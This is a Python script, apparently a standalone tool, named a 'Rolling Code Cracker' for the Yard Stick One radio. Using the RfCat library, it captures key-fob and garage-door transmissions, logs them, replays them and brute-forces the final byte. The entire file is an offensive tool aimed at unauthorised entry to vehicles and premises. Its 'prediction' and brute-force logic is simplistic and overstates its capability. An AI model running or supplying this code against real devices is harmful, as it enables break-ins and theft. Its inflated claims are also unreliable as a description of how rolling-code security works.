import sys
import time
import argparse
import json
from collections import deque
from rflib import *

# -------------------------------------------
# Yard Stick One Rolling Code Cracker
# -------------------------------------------
# Features:
# - Captures rolling codes from key fobs, garage doors, and remote controls.
# - Detects patterns and attempts to predict the next rolling code.
# - Logs captured rolling codes for future replay or analysis.
# - Allows replaying previously captured rolling codes.
# - Implements advanced rolling code pattern detection and brute-force attack mode.
#
# Requirements:
# - Yard Stick One (YardStickOne) hardware
# - RfCat Python library
# - Python 3.x
#
# Usage:
# python yardstick_rolling_code_cracker.py --freq 433920000 --capture --log rolling_codes.json
# python yardstick_rolling_code_cracker.py --freq 433920000 --replay rolling_codes.json
# python yardstick_rolling_code_cracker.py --freq 433920000 --bruteforce rolling_codes.json
# -------------------------------------------

def configure_device(d, frequency, power):
    """Configures the Yard Stick One device for rolling code analysis."""
    d.setModeRX()
    d.setFreq(frequency)
    d.setMaxPower() if power == 10 else d.setPower(power)
    print(f"[*] Configured: Frequency {frequency / 1e6} MHz, Power {power}")

def capture_rolling_codes(d, log_file=None):
    """Captures rolling codes and attempts to detect patterns."""
    print("[+] Capturing rolling codes... Press Ctrl+C to stop.")
    captured_codes = deque(maxlen=50)  # Store last 50 rolling codes
    try:
        while True:
            packet = d.RFrecv(timeout=5000)
            if packet:
                rolling_code = packet.hex()
                print(f"[+] Captured Rolling Code: {rolling_code}")
                captured_codes.append(rolling_code)
                
                # Detect rolling code sequences
                if len(captured_codes) > 1:
                    prev_code = captured_codes[-2]
                    if rolling_code[:-2] == prev_code[:-2]:
                        print(f"[*] Rolling Code Sequence Detected: {prev_code} -> {rolling_code}")
                
                if log_file:
                    with open(log_file, "w") as f:
                        json.dump(list(captured_codes), f, indent=4)
    except KeyboardInterrupt:
        print("[!] Capture mode stopped.")

def replay_rolling_codes(d, filename):
    """Replays captured rolling codes from a log file."""
    print(f"[+] Replaying rolling codes from {filename}...")
    try:
        with open(filename, "r") as f:
            rolling_codes = json.load(f)
            for code in rolling_codes:
                data = bytes.fromhex(code)
                d.setModeTX()
                d.RFxmit(data)
                print(f"[+] Replayed Rolling Code: {code}")
                time.sleep(1)  # Small delay between replays
    except Exception as e:
        print(f"[!] Error replaying rolling codes: {e}")

def brute_force_rolling_codes(d, filename):
    """Attempts to brute-force rolling codes based on captured sequences."""
    print(f"[+] Initiating rolling code brute-force attack using {filename}...")
    try:
        with open(filename, "r") as f:
            rolling_codes = json.load(f)
            base_code = rolling_codes[-1]  # Start with the latest captured rolling code
            for i in range(256):  # Example brute-force attempt on last byte
                test_code = base_code[:-2] + f"{i:02x}"
                data = bytes.fromhex(test_code)
                d.setModeTX()
                d.RFxmit(data)
                print(f"[+] Sent Brute-Force Code: {test_code}")
                time.sleep(0.5)
    except Exception as e:
        print(f"[!] Error during brute-force attack: {e}")

def main():
    parser = argparse.ArgumentParser(description="Yard Stick One Rolling Code Cracker")
    parser.add_argument("--freq", type=int, required=True, help="Frequency in Hz to capture rolling codes")
    parser.add_argument("--power", type=int, default=10, help="Transmission power level (default: 10)")
    parser.add_argument("--capture", action='store_true', help="Capture rolling codes from RF transmissions")
    parser.add_argument("--log", type=str, help="Log captured rolling codes to a file")
    parser.add_argument("--replay", type=str, help="Replay captured rolling codes from a file")
    parser.add_argument("--bruteforce", type=str, help="Brute-force rolling codes based on a captured sequence")
    args = parser.parse_args()

    try:
        d = RfCat()
        configure_device(d, args.freq, args.power)
        
        if args.capture:
            capture_rolling_codes(d, args.log)
        elif args.replay:
            replay_rolling_codes(d, args.replay)
        elif args.bruteforce:
            brute_force_rolling_codes(d, args.bruteforce)
        else:
            print("[!] No mode specified. Use --capture, --replay, or --bruteforce.")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        d.setModeIDLE()
        d.cleanup()

if __name__ == "__main__":
    main()
